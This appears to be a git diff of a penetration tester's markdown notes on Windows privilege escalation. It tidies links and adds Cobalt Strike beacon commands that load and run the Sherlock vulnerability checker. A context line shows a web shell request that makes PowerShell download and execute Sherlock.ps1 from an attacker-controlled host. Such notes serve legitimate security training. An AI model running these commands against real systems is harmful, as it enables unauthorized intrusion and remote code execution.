@@ -4,9 +4,9 @@ We now have a low-privileges shell that we want to escalate into a privileged sh
 
 Mubix Post exploitation commands:[ https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit](https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit)
 
-Guide based off of 
+Guide based off of
 
-https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+[https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
 
 ## Windows Exploit Suggester
 
@@ -17,6 +17,13 @@ The output shows either public exploits (E), or Metasploit modules (M) as indica
 ```
 
 ## Sherlock
+
+Invoke with Cobalt-Strike
+
+```
+beacon> powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1
+beacon> powershell Find-AllVulns
+```
 
 ```
 view-source:10.10.10.X/shell.php?cmd=echo IEX(New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -
